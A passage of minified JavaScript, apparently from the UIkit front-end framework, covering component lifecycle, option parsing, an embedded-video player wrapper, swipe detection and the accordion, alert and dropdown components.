                    x: e.left,
                    y: e.bottom
                }]
            ];
            return e.right <= i.x || (e.left >= i.x ? (r[0].reverse(), r[1].reverse()) : e.bottom <= i.y ? r[0].reverse() : e.top >= i.y && r[1].reverse()), !!r.reduce(function(t, e) {
                return t + (bi(n, e[0]) < bi(i, e[0]) && bi(n, e[1]) > bi(i, e[1]))
            }, 0)
        }
    };
    var yi = {};

    function xi(t, e, i) {
        return yi.computed(x(t) ? t.call(i, i) : t, x(e) ? e.call(i, i) : e)
    }

    function ki(t, e) {
        return t = t && !y(t) ? [t] : t, e ? t ? t.concat(e) : y(e) ? e : [e] : t
    }

    function $i(e, i, n) {
        var r = {};
        if (x(i) && (i = i.options), i.extends && (e = $i(e, i.extends, n)), i.mixins)
            for (var t = 0, o = i.mixins.length; t < o; t++) e = $i(e, i.mixins[t], n);
        for (var s in e) h(s);
        for (var a in i) l(e, a) || h(a);

        function h(t) {
            r[t] = (yi[t] || function(t, e) {
                return O(e) ? t : e
            })(e[t], i[t], n)
        }
        return r
    }

    function Ii(t, e) {
        var i;
        void 0 === e && (e = []);
        try {
            return t ? v(t, "{") ? JSON.parse(t) : e.length && !b(t, ":") ? ((i = {})[e[0]] = t, i) : t.split(";").reduce(function(t, e) {
                var i = e.split(/:(.*)/),
                    n = i[0],
                    r = i[1];
                return n && !O(r) && (t[n.trim()] = r.trim()), t
            }, {}) : {}
        } catch (t) {
            return {}
        }
    }
    yi.events = yi.created = yi.beforeConnect = yi.connected = yi.beforeDisconnect = yi.disconnected = yi.destroy = ki, yi.args = function(t, e) {
        return ki(e || t)
    }, yi.update = function(t, e) {
        return U(ki(t, x(e) ? {
            read: e
        } : e), "order")
    }, yi.props = function(t, e) {
        return y(e) && (e = e.reduce(function(t, e) {
            return t[e] = String, t
        }, {})), yi.methods(t, e)
    }, yi.computed = yi.methods = function(t, e) {
        return e ? t ? R({}, t, e) : e : t
    }, yi.data = function(e, i, t) {
        return t ? xi(e, i, t) : i ? e ? function(t) {
            return xi(e, i, t)
        } : i : e
    };
    var Si = 0,
        Ti = function(t) {
            this.id = ++Si, this.el = H(t)
        };

    function Ei(t, e) {
        try {
            t.contentWindow.postMessage(JSON.stringify(R({
                event: "command"
            }, e)), "*")
        } catch (t) {}
    }
    Ti.prototype.isVideo = function() {
        return this.isYoutube() || this.isVimeo() || this.isHTML5()
    }, Ti.prototype.isHTML5 = function() {
        return "VIDEO" === this.el.tagName
    }, Ti.prototype.isIFrame = function() {
        return "IFRAME" === this.el.tagName
    }, Ti.prototype.isYoutube = function() {
        return this.isIFrame() && !!this.el.src.match(/\/\/.*?youtube(-nocookie)?\.[a-z]+\/(watch\?v=[^&\s]+|embed)|youtu\.be\/.*/)
    }, Ti.prototype.isVimeo = function() {
        return this.isIFrame() && !!this.el.src.match(/vimeo\.com\/video\/.*/)
    }, Ti.prototype.enableApi = function() {
        var e = this;
        if (this.ready) return this.ready;
        var i, r = this.isYoutube(),
            o = this.isVimeo();
        return r || o ? this.ready = new Xt(function(t) {
            var n;
            Lt(e.el, "load", function() {
                if (r) {
                    var t = function() {
                        return Ei(e.el, {
                            event: "listening",
                            id: e.id
                        })
                    };
                    i = setInterval(t, 100), t()
                }
            }), (n = function(t) {
                return r && t.id === e.id && "onReady" === t.event || o && Number(t.player_id) === e.id
            }, new Xt(function(i) {
                Lt(window, "message", function(t, e) {
                    return i(e)
                }, !1, function(t) {
                    var e = t.data;
                    if (e && _(e)) {
                        try {
                            e = JSON.parse(e)
                        } catch (t) {
                            return
                        }
                        return e && n(e)
                    }
                })
            })).then(function() {
                t(), i && clearInterval(i)
            }), Q(e.el, "src", e.el.src + (b(e.el.src, "?") ? "&" : "?") + (r ? "enablejsapi=1" : "api=1&player_id=" + e.id))
        }) : Xt.resolve()
    }, Ti.prototype.play = function() {
        var t = this;
        if (this.isVideo())
            if (this.isIFrame()) this.enableApi().then(function() {
                return Ei(t.el, {
                    func: "playVideo",
                    method: "play"
                })
            });
            else if (this.isHTML5()) try {
            var e = this.el.play();
            e && e.catch(K)
        } catch (t) {}
    }, Ti.prototype.pause = function() {
        var t = this;
        this.isVideo() && (this.isIFrame() ? this.enableApi().then(function() {
            return Ei(t.el, {
                func: "pauseVideo",
                method: "pause"
            })
        }) : this.isHTML5() && this.el.pause())
    }, Ti.prototype.mute = function() {
        var t = this;
        this.isVideo() && (this.isIFrame() ? this.enableApi().then(function() {
            return Ei(t.el, {
                func: "mute",
                method: "setVolume",
                value: 0
            })
        }) : this.isHTML5() && (this.el.muted = !0, Q(this.el, "muted", "")))
    };
    var Ci, Ai, Ni = "IntersectionObserver" in window ? window.IntersectionObserver : function() {
            function t(e, t) {
                var i = this;
                void 0 === t && (t = {});
                var n = t.rootMargin;
                void 0 === n && (n = "0 0"), this.targets = [];
                var r, o = (n || "0 0").split(" ").map(P),
                    s = o[0],
                    a = o[1];
                this.offsetTop = s, this.offsetLeft = a, this.apply = function() {
                    r || (r = requestAnimationFrame(function() {
                        return setTimeout(function() {
                            var t = i.takeRecords();
                            t.length && e(t, i), r = !1
                        })
                    }))
                }, this.off = Ht(window, "scroll resize load", this.apply, {
                    passive: !0,
                    capture: !0
                })
            }
            return t.prototype.takeRecords = function() {
                var i = this;
                return this.targets.filter(function(t) {
                    var e = hi(t.target, i.offsetTop, i.offsetLeft);
                    if (null === t.isIntersecting || e ^ t.isIntersecting) return t.isIntersecting = e, !0
                })
            }, t.prototype.observe = function(t) {
                this.targets.push({
                    target: t,
                    isIntersecting: null
                }), this.apply()
            }, t.prototype.disconnect = function() {
                this.targets = [], this.off()
            }, t
        }(),
        _i = {};

    function Mi(t) {
        return "touch" === t.pointerType || t.touches || Ai
    }

    function Di(t, e) {
        void 0 === e && (e = "client");
        var i = t.touches,
            n = t.changedTouches,
            r = i && i[0] || n && n[0] || t;
        return {
            x: r[e + "X"],
            y: r[e + "Y"]
        }
    }

    function Oi(t) {
        return !(!v(t, "uk-") && !v(t, "data-uk-")) && g(t.replace("data-uk-", "").replace("uk-", ""))
    }
    Ht(document, Mt, function(t) {
        _i.el && (_i = {});
        var e = t.target,
            i = Di(t),
            n = i.x,
            r = i.y;
        _i.el = "tagName" in e ? e : e.parentNode, _i.x = n, _i.y = r, Ai = Mi(t)
    }), Ht(document, Ot, function(t) {
        var e = Di(t),
            r = e.x,
            o = e.y;
        _i.el && r && 100 < Math.abs(_i.x - r) || o && 100 < Math.abs(_i.y - o) ? Ci = setTimeout(function() {
            var t, e, i, n;
            _i.el && (jt(_i.el, "swipe"), jt(_i.el, "swipe" + (t = _i.x, e = _i.y, i = r, n = o, Math.abs(t - i) >= Math.abs(e - n) ? 0 < t - i ? "Left" : "Right" : 0 < e - n ? "Up" : "Down"))), _i = {}
        }) : _i = {}, setTimeout(function() {
            return Ai = !1
        })
    }), Ht(document, Pt, function() {
        Ci && clearTimeout(Ci), Ci = null, _i = {}
    });
    var Bi, zi, Pi, Hi, Fi = function(t) {
        this._init(t)
    };
    Fi.util = Object.freeze({
            ajax: te,
            getImage: ee,
            transition: We,
            Transition: Ve,
            animate: qe,
            Animation: Xe,
            attr: Q,
            hasAttr: tt,
            removeAttr: et,
            data: it,
            addClass: ke,
            removeClass: $e,
            removeClasses: Ie,
            replaceClass: Se,
            hasClass: Te,
            toggleClass: Ee,
            positionAt: Ge,
            offset: Je,
            position: Qe,
            height: ti,
            width: ei,
            boxModelAdjust: ni,
            flipPosition: ai,
            isInView: hi,
            scrolledOver: li,
            scrollTop: ci,
            offsetPosition: ui,
            ready: ie,
            index: ne,
            getIndex: re,
            empty: oe,
            html: se,
            prepend: function(e, t) {
                return (e = be(e)).hasChildNodes() ? ce(t, function(t) {
                    return e.insertBefore(t, e.firstChild)
                }) : ae(e, t)
            },
            append: ae,
            before: he,
            after: le,
            remove: ue,
            wrapAll: de,
            wrapInner: fe,
            unwrap: pe,
            fragment: ve,
            apply: we,
            $: be,
            $$: ye,
            isIE: Et,
            isRtl: Ct,
            hasTouch: _t,
            pointerDown: Mt,
            pointerMove: Dt,
            pointerUp: Ot,
            pointerEnter: Bt,
            pointerLeave: zt,
            pointerCancel: Pt,
            on: Ht,
            off: Ft,
            once: Lt,
            trigger: jt,
            createEvent: Wt,
            toEventTargets: qt,
            preventClick: Ut,
            fastdom: pi,
            isVoidElement: xt,
            isVisible: kt,
            selInput: $t,
            isInput: It,
            filter: St,
            within: Tt,
            bind: p,
            hasOwn: l,
            hyphenate: m,
            camelize: g,
            ucfirst: a,
            startsWith: v,
            endsWith: u,
            includes: b,
            isArray: y,
            isFunction: x,
            isObject: k,
            isPlainObject: $,
            isWindow: I,
            isDocument: S,
            isJQuery: T,
            isNode: E,
            isNodeCollection: A,
            isBoolean: N,
            isString: _,
            isNumber: M,
            isNumeric: D,
            isUndefined: O,
            toBoolean: B,
            toNumber: z,
            toFloat: P,
            toNode: H,
            toNodes: L,
            toList: j,
            toMs: W,
            isEqual: V,
            swap: Y,
            assign: R,
            each: q,
            sortBy: U,
            clamp: X,
            noop: K,
            intersectRect: G,
            pointInRect: J,
            Dimensions: Z,
            MouseTracker: wi,
            mergeOptions: $i,
            parseOptions: Ii,
            Player: Ti,
            Promise: Xt,
            Deferred: Kt,
            IntersectionObserver: Ni,
            query: nt,
            queryAll: rt,
            find: st,
            findAll: at,
            matches: pt,
            closest: gt,
            parents: vt,
            escape: bt,
            css: De,
            getStyles: Oe,
            getStyle: Be,
            getCssVar: Pe,
            propName: Fe,
            isTouch: Mi,
            getPos: Di
        }), Fi.data = "__uikit__", Fi.prefix = "uk-", Fi.options = {},
        function(i) {
            var e, n = i.data;

            function r(t, e) {
                if (t)
                    for (var i in t) t[i]._connected && t[i]._callUpdate(e)
            }
            i.use = function(t) {
                if (!t.installed) return t.call(null, this), t.installed = !0, this
            }, i.mixin = function(t, e) {
                (e = (_(e) ? i.component(e) : e) || this).options = $i(e.options, t)
            }, i.extend = function(t) {
                t = t || {};
                var e = function(t) {
                    this._init(t)
                };
                return ((e.prototype = Object.create(this.prototype)).constructor = e).options = $i(this.options, t), e.super = this, e.extend = this.extend, e
            }, i.update = function(t, e) {
                (function t(e, i) {
                    e && e !== document.body && e.parentNode && (t(e.parentNode, i), i(e.parentNode))
                })(t = t ? H(t) : document.body, function(t) {
                    return r(t[n], e)
                }), we(t, function(t) {
                    return r(t[n], e)
                })
            }, Object.defineProperty(i, "container", {
                get: function() {
                    return e || document.body
                },
                set: function(t) {
                    e = be(t)
                }
            })
        }(Fi), (Bi = Fi).prototype._callHook = function(t) {
            var e = this,
                i = this.$options[t];
            i && i.forEach(function(t) {
                return t.call(e)
            })
        }, Bi.prototype._callConnected = function() {
            this._connected || (this._data = {}, this._computeds = {}, this._initProps(), this._callHook("beforeConnect"), this._connected = !0, this._initEvents(), this._initObserver(), this._callHook("connected"), this._callUpdate())
        }, Bi.prototype._callDisconnected = function() {
            this._connected && (this._callHook("beforeDisconnect"), this._observer && (this._observer.disconnect(), this._observer = null), this._unbindEvents(), this._callHook("disconnected"), this._connected = !1)
        }, Bi.prototype._callUpdate = function(t) {
            var o = this;
            void 0 === t && (t = "update");
            var s = t.type || t;
            b(["update", "resize"], s) && this._callWatches();
            var e = this.$options.update,
                i = this._frames,
                a = i.reads,
                h = i.writes;
            e && e.forEach(function(t, e) {
                var i = t.read,
                    n = t.write,
                    r = t.events;
                ("update" === s || b(r, s)) && (i && !b(pi.reads, a[e]) && (a[e] = pi.read(function() {
                    var t = o._connected && i.call(o, o._data, s);
                    !1 === t && n ? pi.clear(h[e]) : $(t) && R(o._data, t)
                })), n && !b(pi.writes, h[e]) && (h[e] = pi.write(function() {
                    return o._connected && n.call(o, o._data, s)
                })))
            })
        },
        function(t) {
            var e = 0;

            function s(t, e) {
                var i = {},
                    n = t.args;
                void 0 === n && (n = []);
                var r = t.props;
                void 0 === r && (r = {});
                var o = t.el;
                if (!r) return i;
                for (var s in r) {
                    var a = m(s),
                        h = it(o, a);
                    if (!O(h)) {
                        if (h = r[s] === Boolean && "" === h || d(r[s], h), "target" === a && (!h || v(h, "_"))) continue;
                        i[s] = h
                    }
                }
                var l = Ii(it(o, e), n);
                for (var c in l) {
                    var u = g(c);
                    void 0 !== r[u] && (i[u] = d(r[u], l[c]))
                }
                return i
            }

            function i(n, r, o) {
                Object.defineProperty(n, r, {
                    enumerable: !0,
                    get: function() {
                        var t = n._computeds,
                            e = n.$props,
                            i = n.$el;
                        return l(t, r) || (t[r] = (o.get || o).call(n, e, i)), t[r]
                    },
                    set: function(t) {
                        var e = n._computeds;
                        e[r] = o.set ? o.set.call(n, t) : t, O(e[r]) && delete e[r]
                    }
                })
            }

            function f(e, i, n) {
                $(i) || (i = {
                    name: n,
                    handler: i
                });
                var r, o, t = i.name,
                    s = i.el,
                    a = i.handler,
                    h = i.capture,
                    l = i.passive,
                    c = i.delegate,
                    u = i.filter,
                    d = i.self;
                s = x(s) ? s.call(e) : s || e.$el, y(s) ? s.forEach(function(t) {
                    return f(e, R({}, i, {
                        el: t
                    }), n)
                }) : !s || u && !u.call(e) || (r = _(a) ? e[a] : p(a, e), a = function(t) {
                    return y(t.detail) ? r.apply(void 0, [t].concat(t.detail)) : r(t)
                }, d && (o = a, a = function(t) {
                    if (t.target === t.currentTarget || t.target === t.current) return o.call(null, t)
                }), e._events.push(Ht(s, t, c ? _(c) ? c : c.call(e) : null, a, N(l) ? {
                    passive: l,
                    capture: h
                } : h)))
            }

            function n(t, e) {
                return t.every(function(t) {
                    return !t || !l(t, e)
                })
            }

            function d(t, e) {
                return t === Boolean ? B(e) : t === Number ? z(e) : "list" === t ? j(e) : t ? t(e) : e
            }
            t.prototype._init = function(t) {
                (t = t || {}).data = function(t, e) {
                    var i = t.data,
                        n = (t.el, e.args),
                        r = e.props;
                    if (void 0 === r && (r = {}), i = y(i) ? n && n.length ? i.slice(0, n.length).reduce(function(t, e, i) {
                            return $(e) ? R(t, e) : t[n[i]] = e, t
                        }, {}) : void 0 : i)
                        for (var o in i) O(i[o]) ? delete i[o] : i[o] = r[o] ? d(r[o], i[o]) : i[o];
                    return i
                }(t, this.constructor.options), this.$options = $i(this.constructor.options, t, this), this.$el = null, this.$props = {}, this._frames = {
                    reads: {},
                    writes: {}
                }, this._events = [], this._uid = e++, this._initData(), this._initMethods(), this._initComputeds(), this._callHook("created"), t.el && this.$mount(t.el)
            }, t.prototype._initData = function() {
                var t = this.$options.data;
                for (var e in void 0 === t && (t = {}), t) this.$props[e] = this[e] = t[e]
            }, t.prototype._initMethods = function() {
                var t = this.$options.methods;
                if (t)
                    for (var e in t) this[e] = p(t[e], this)
            }, t.prototype._initComputeds = function() {
                var t = this.$options.computed;
                if (this._computeds = {}, t)
                    for (var e in t) i(this, e, t[e])
            }, t.prototype._callWatches = function() {
                var t = this.$options.computed,
                    e = this._computeds;
                for (var i in e) {
                    var n = e[i];
                    delete e[i], t[i].watch && !V(n, this[i]) && t[i].watch.call(this, this[i], n)
                }
            }, t.prototype._initProps = function(t) {
                var e;
                for (e in t = t || s(this.$options, this.$name)) O(t[e]) || (this.$props[e] = t[e]);
                var i = [this.$options.computed, this.$options.methods];
                for (e in this.$props) e in t && n(i, e) && (this[e] = this.$props[e])
            }, t.prototype._initEvents = function() {
                var i = this,
                    t = this.$options.events;
                t && t.forEach(function(t) {
                    if (l(t, "handler")) f(i, t);
                    else
                        for (var e in t) f(i, t[e], e)
                })
            }, t.prototype._unbindEvents = function() {
                this._events.forEach(function(t) {
                    return t()
                }), this._events = []
            }, t.prototype._initObserver = function() {
                var i = this,
                    t = this.$options,
                    n = t.attrs,
                    e = t.props,
                    r = t.el;
                if (!this._observer && e && !1 !== n) {
                    n = y(n) ? n : Object.keys(e), this._observer = new MutationObserver(function() {
                        var e = s(i.$options, i.$name);
                        n.some(function(t) {
                            return !O(e[t]) && e[t] !== i.$props[t]
                        }) && i.$reset()
                    });
                    var o = n.map(function(t) {
                        return m(t)
                    }).concat(this.$name);
                    this._observer.observe(r, {
                        attributes: !0,
                        attributeFilter: o.concat(o.map(function(t) {
                            return "data-" + t
                        }))
                    })
                }
            }
        }(Fi), Pi = (zi = Fi).data, Hi = {}, zi.component = function(s, t) {
            if (!t) return $(Hi[s]) && (Hi[s] = zi.extend(Hi[s])), Hi[s];
            zi[s] = function(t, i) {
                for (var e = arguments.length, n = Array(e); e--;) n[e] = arguments[e];
                var r = zi.component(s);
                return $(t) ? new r({
                    data: t
                }) : r.options.functional ? new r({
                    data: [].concat(n)
                }) : t && t.nodeType ? o(t) : ye(t).map(o)[0];

                function o(t) {
                    var e = zi.getComponent(t, s);
                    if (e) {
                        if (!i) return e;
                        e.$destroy()
                    }
                    return new r({
                        el: t,
                        data: i
                    })
                }
            };
            var e = $(t) ? R({}, t) : t.options;
            if (e.name = s, e.install && e.install(zi, e, s), zi._initialized && !e.functional) {
                var i = m(s);
                pi.read(function() {
                    return zi[s]("[uk-" + i + "],[data-uk-" + i + "]")
                })
            }
            return Hi[s] = $(t) ? e : t
        }, zi.getComponents = function(t) {
            return t && t[Pi] || {}
        }, zi.getComponent = function(t, e) {
            return zi.getComponents(t)[e]
        }, zi.connect = function(t) {
            if (t[Pi])
                for (var e in t[Pi]) t[Pi][e]._callConnected();
            for (var i = 0; i < t.attributes.length; i++) {
                var n = Oi(t.attributes[i].name);
                n && n in Hi && zi[n](t)
            }
        }, zi.disconnect = function(t) {
            for (var e in t[Pi]) t[Pi][e]._callDisconnected()
        },
        function(n) {
            var r = n.data;
            n.prototype.$mount = function(t) {
                var e = this.$options.name;
                t[r] || (t[r] = {}), t[r][e] || ((t[r][e] = this).$el = this.$options.el = this.$options.el || t, Tt(t, document) && this._callConnected())
            }, n.prototype.$emit = function(t) {
                this._callUpdate(t)
            }, n.prototype.$reset = function() {
                this._callDisconnected(), this._callConnected()
            }, n.prototype.$destroy = function(t) {
                void 0 === t && (t = !1);
                var e = this.$options,
                    i = e.el,
                    n = e.name;
                i && this._callDisconnected(), this._callHook("destroy"), i && i[r] && (delete i[r][n], Object.keys(i[r]).length || delete i[r], t && ue(this.$el))
            }, n.prototype.$create = function(t, e, i) {
                return n[t](e, i)
            }, n.prototype.$update = n.update, n.prototype.$getComponent = n.getComponent;
            var e = {};
            Object.defineProperties(n.prototype, {
                $container: Object.getOwnPropertyDescriptor(n, "container"),
                $name: {
                    get: function() {
                        var t = this.$options.name;
                        return e[t] || (e[t] = n.prefix + m(t)), e[t]
                    }
                }
            })
        }(Fi);
    var Li = {
            connected: function() {
                !Te(this.$el, this.$name) && ke(this.$el, this.$name)
            }
        },
        ji = {
            props: {
                cls: Boolean,
                animation: "list",
                duration: Number,
                origin: String,
                transition: String,
                queued: Boolean
            },
            data: {
                cls: !1,
                animation: [!1],
                duration: 200,
                origin: !1,
                transition: "linear",
                queued: !1,
                initProps: {
                    overflow: "",
                    height: "",
                    paddingTop: "",
                    paddingBottom: "",
                    marginTop: "",
                    marginBottom: ""
                },
                hideProps: {
                    overflow: "hidden",
                    height: 0,
                    paddingTop: 0,
                    paddingBottom: 0,
                    marginTop: 0,
                    marginBottom: 0
                }
            },
            computed: {
                hasAnimation: function(t) {
                    return !!t.animation[0]
                },
                hasTransition: function(t) {
                    var e = t.animation;
                    return this.hasAnimation && !0 === e[0]
                }
            },
            methods: {
                toggleElement: function(l, c, u) {
                    var d = this;
                    return new Xt(function(t) {
                        l = L(l);
                        var e, i = function(t) {
                                return Xt.all(t.map(function(t) {
                                    return d._toggleElement(t, c, u)
                                }))
                            },
                            n = l.filter(function(t) {
                                return d.isToggled(t)
                            }),
                            r = l.filter(function(t) {
                                return !b(n, t)
                            });
                        if (d.queued && O(u) && O(c) && d.hasAnimation && !(l.length < 2)) {
                            var o = document.body,
                                s = o.scrollTop,
                                a = n[0],
                                h = Xe.inProgress(a) && Te(a, "uk-animation-leave") || Ve.inProgress(a) && "0px" === a.style.height;
                            e = i(n), h || (e = e.then(function() {
                                var t = i(r);
                                return o.scrollTop = s, t
                            }))
                        } else e = i(r.concat(n));
                        e.then(t, K)
                    })
                },
                toggleNow: function(e, i) {
                    var n = this;
                    return new Xt(function(t) {
                        return Xt.all(L(e).map(function(t) {
                            return n._toggleElement(t, i, !1)
                        })).then(t, K)
                    })
                },
                isToggled: function(t) {
                    var e = L(t || this.$el);
                    return this.cls ? Te(e, this.cls.split(" ")[0]) : !tt(e, "hidden")
                },
                updateAria: function(t) {
                    !1 === this.cls && Q(t, "aria-hidden", !this.isToggled(t))
                },
                _toggleElement: function(t, e, i) {
                    var n = this;
                    if (e = N(e) ? e : Xe.inProgress(t) ? Te(t, "uk-animation-leave") : Ve.inProgress(t) ? "0px" === t.style.height : !this.isToggled(t), !jt(t, "before" + (e ? "show" : "hide"), [this])) return Xt.reject();
                    var r, o, s, a, h, l, c, u, d, f, p, m, g = (x(i) ? i : !1 !== i && this.hasAnimation ? this.hasTransition ? (c = (l = this).isToggled, u = l.duration, d = l.initProps, f = l.hideProps, p = l.transition, m = l._toggle, function(t, e) {
                        var i = Ve.inProgress(t),
                            n = t.hasChildNodes ? P(De(t.firstElementChild, "marginTop")) + P(De(t.lastElementChild, "marginBottom")) : 0,
                            r = kt(t) ? ti(t) + (i ? 0 : n) : 0;
                        Ve.cancel(t), c(t) || m(t, !0), ti(t, ""), pi.flush();
                        var o = ti(t) + (i ? 0 : n);
                        return ti(t, r), (e ? Ve.start(t, R({}, d, {
                            overflow: "hidden",
                            height: o
                        }), Math.round(u * (1 - r / o)), p) : Ve.start(t, f, Math.round(u * (r / o)), p).then(function() {
                            return m(t, !1)
                        })).then(function() {
                            return De(t, d)
                        })
                    }) : (o = (r = this).animation, s = r.duration, a = r.origin, h = r._toggle, function(t, e) {
                        return Xe.cancel(t), e ? (h(t, !0), Xe.in(t, o[0], s, a)) : Xe.out(t, o[1] || o[0], s, a).then(function() {
                            return h(t, !1)
                        })
                    }) : this._toggle)(t, e);
                    jt(t, e ? "show" : "hide", [this]);
                    var v = function() {
                        jt(t, e ? "shown" : "hidden", [n]), n.$update(t)
                    };
                    return g ? g.then(v) : Xt.resolve(v())
                },
                _toggle: function(t, e) {
                    var i;
                    t && (e = Boolean(e), this.cls ? (i = b(this.cls, " ") || e !== Te(t, this.cls)) && Ee(t, this.cls, b(this.cls, " ") ? void 0 : e) : (i = e === tt(t, "hidden")) && Q(t, "hidden", e ? null : ""), ye("[autofocus]", t).some(function(t) {
                        return kt(t) ? t.focus() || !0 : t.blur()
                    }), this.updateAria(t), i && this.$update(t))
                }
            }
        };
    var Wi = {
            mixins: [Li, ji],
            props: {
                targets: String,
                active: null,
                collapsible: Boolean,
                multiple: Boolean,
                toggle: String,
                content: String,
                transition: String
            },
            data: {
                targets: "> *",
                active: !1,
                animation: [!0],
                collapsible: !0,
                multiple: !1,
                clsOpen: "uk-open",
                toggle: "> .uk-accordion-title",
                content: "> .uk-accordion-content",
                transition: "ease"
            },
            computed: {
                items: function(t, e) {
                    return ye(t.targets, e)
                }
            },
            events: [{
                name: "click",
                delegate: function() {
                    return this.targets + " " + this.$props.toggle
                },
                handler: function(t) {
                    t.preventDefault(), this.toggle(ne(ye(this.targets + " " + this.$props.toggle, this.$el), t.current))
                }
            }],
            connected: function() {
                if (!1 !== this.active) {
                    var t = this.items[Number(this.active)];
                    t && !Te(t, this.clsOpen) && this.toggle(t, !1)
                }
            },
            update: function() {
                var e = this;
                this.items.forEach(function(t) {
                    return e._toggle(be(e.content, t), Te(t, e.clsOpen))
                });
                var t = !this.collapsible && !Te(this.items, this.clsOpen) && this.items[0];
                t && this.toggle(t, !1)
            },
            methods: {
                toggle: function(r, o) {
                    var s = this,
                        t = re(r, this.items),
                        a = St(this.items, "." + this.clsOpen);
                    (r = this.items[t]) && [r].concat(!this.multiple && !b(a, r) && a || []).forEach(function(t) {
                        var e = t === r,
                            i = e && !Te(t, s.clsOpen);
                        if (i || !e || s.collapsible || !(a.length < 2)) {
                            Ee(t, s.clsOpen, i);
                            var n = t._wrapper ? t._wrapper.firstElementChild : be(s.content, t);
                            t._wrapper || (t._wrapper = de(n, "<div>"), Q(t._wrapper, "hidden", i ? "" : null)), s._toggle(n, !0), s.toggleElement(t._wrapper, i, o).then(function() {
                                Te(t, s.clsOpen) === i && (i || s._toggle(n, !1), t._wrapper = null, pe(n))
                            })
                        }
                    })
                }
            }
        },
        Vi = {
            mixins: [Li, ji],
            args: "animation",
            props: {
                close: String
            },
            data: {
                animation: [!0],
                selClose: ".uk-alert-close",
                duration: 150,
                hideProps: R({
                    opacity: 0
                }, ji.data.hideProps)
            },
            events: [{
                name: "click",
                delegate: function() {
                    return this.selClose
                },
                handler: function(t) {
                    t.preventDefault(), this.close()
                }
            }],
            methods: {
                close: function() {
                    var t = this;
                    this.toggleElement(this.$el).then(function() {
                        return t.$destroy(!0)
                    })
                }
            }
        };

    function Yi(r) {
        ie(function() {
            var i;
            r.update(), Ht(window, "load resize", function() {
                return r.update(null, "resize")
            }), Ht(document, "loadedmetadata load", function(t) {
                var e = t.target;
                return r.update(e, "resize")
            }, !0), Ht(window, "scroll", function(t) {
                if (!i) {
                    i = !0, pi.write(function() {
                        return i = !1
                    });
                    var e = t.target;
                    r.update(1 !== e.nodeType ? document.body : e, t.type)
                }
            }, {
                passive: !0,
                capture: !0
            });
            var n = 0;
            Ht(document, "animationstart", function(t) {
                var e = t.target;
                (De(e, "animationName") || "").match(/^uk-.*(left|right)/) && (n++, De(document.body, "overflowX", "hidden"), setTimeout(function() {
                    --n || De(document.body, "overflowX", "")
                }, W(De(e, "animationDuration")) + 100))
            }, !0)
        })
    }
    var Ri, qi, Ui = {
            args: "autoplay",
            props: {
                automute: Boolean,
                autoplay: Boolean
            },
            data: {
                automute: !1,
                autoplay: !0
            },
            computed: {
                inView: function(t) {
                    return "inview" === t.autoplay
                }
            },
            connected: function() {
                this.inView && !tt(this.$el, "preload") && (this.$el.preload = "none"), this.player = new Ti(this.$el), this.automute && this.player.mute()
            },
            update: {
                read: function() {
                    return !!this.player && {
                        visible: kt(this.$el) && "hidden" !== De(this.$el, "visibility"),
                        inView: this.inView && hi(this.$el)
                    }
                },
                write: function(t) {
                    var e = t.visible,
                        i = t.inView;
                    !e || this.inView && !i ? this.player.pause() : (!0 === this.autoplay || this.inView && i) && this.player.play()
                },
                events: ["resize", "scroll"]
            }
        },
        Xi = {
            mixins: [Li, Ui],
            props: {
                width: Number,
                height: Number
            },
            data: {
                automute: !0
            },
            update: {
                read: function() {
                    var t = this.$el;
                    if (!kt(t)) return !1;
                    var e = t.parentNode;
                    return {
                        height: e.offsetHeight,
                        width: e.offsetWidth
                    }
                },
                write: function(t) {
                    var e = t.height,
                        i = t.width,
                        n = this.$el,
                        r = this.width || n.naturalWidth || n.videoWidth || n.clientWidth,
                        o = this.height || n.naturalHeight || n.videoHeight || n.clientHeight;
                    r && o && De(n, Z.cover({
                        width: r,
                        height: o
                    }, {
                        width: i + (i % 2 ? 1 : 0),
                        height: e + (e % 2 ? 1 : 0)
                    }))
                },
                events: ["resize"]
            }
        },
        Ki = {
            props: {
                pos: String,
                offset: null,
                flip: Boolean,
                clsPos: String
            },
            data: {
                pos: "bottom-" + (Ct ? "right" : "left"),
                flip: !0,
                offset: !1,
                clsPos: ""
            },
            computed: {
                pos: function(t) {
                    var e = t.pos;
                    return (e + (b(e, "-") ? "" : "-center")).split("-")
                },
                dir: function() {
                    return this.pos[0]
                },
                align: function() {
                    return this.pos[1]
                }
            },
            methods: {
                positionAt: function(t, e, i) {
                    var n;
                    Ie(t, this.clsPos + "-(top|bottom|left|right)(-[a-z]+)?"), De(t, {
                        top: "",
                        left: ""
                    });
                    var r = this.offset,
                        o = this.getAxis();
                    D(r) || (r = (n = be(r)) ? Je(n)["x" === o ? "left" : "top"] - Je(e)["x" === o ? "right" : "bottom"] : 0);
                    var s = Ge(t, e, "x" === o ? ai(this.dir) + " " + this.align : this.align + " " + ai(this.dir), "x" === o ? this.dir + " " + this.align : this.align + " " + this.dir, "x" === o ? "" + ("left" === this.dir ? -r : r) : " " + ("top" === this.dir ? -r : r), null, this.flip, i).target,
                        a = s.x,
                        h = s.y;
                    this.dir = "x" === o ? a : h, this.align = "x" === o ? h : a, Ee(t, this.clsPos + "-" + this.dir + "-" + this.align, !1 === this.offset)
                },
                getAxis: function() {
                    return "top" === this.dir || "bottom" === this.dir ? "y" : "x"
                }
            }
        },
        Gi = {
            mixins: [Ki, ji],
            args: "pos",
            props: {
                mode: "list",
                toggle: Boolean,
                boundary: Boolean,
                boundaryAlign: Boolean,
                delayShow: Number,
                delayHide: Number,
                clsDrop: String
            },
            data: {
                mode: ["click", "hover"],
                toggle: "- *",
                boundary: window,
                boundaryAlign: !1,
                delayShow: 0,
                delayHide: 800,
                clsDrop: !1,
                hoverIdle: 200,
                animation: ["uk-animation-fade"],
                cls: "uk-open"
            },
            computed: {
                boundary: function(t, e) {
                    return nt(t.boundary, e)
                },
                clsDrop: function(t) {
                    return t.clsDrop || "uk-" + this.$options.name
                },
                clsPos: function() {
                    return this.clsDrop
                }
            },
            created: function() {
                this.tracker = new wi
            },
            connected: function() {
                ke(this.$el, this.clsDrop);
                var t = this.$props.toggle;
                this.toggle = t && this.$create("toggle", nt(t, this.$el), {
                    target: this.$el,
                    mode: this.mode
                }), !this.toggle && jt(this.$el, "updatearia")
            },
            events: [{
                name: "click",
                delegate: function() {
                    return "." + this.clsDrop + "-close"
                },
                handler: function(t) {
                    t.preventDefault(), this.hide(!1)
                }
            }, {
                name: "click",
                delegate: function() {
                    return 'a[href^="#"]'
                },
                handler: function(t) {
                    if (!t.defaultPrevented) {
                        var e = t.target.hash;
                        e || t.preventDefault(), e && Tt(e, this.$el) || this.hide(!1)
                    }
                }
            }, {
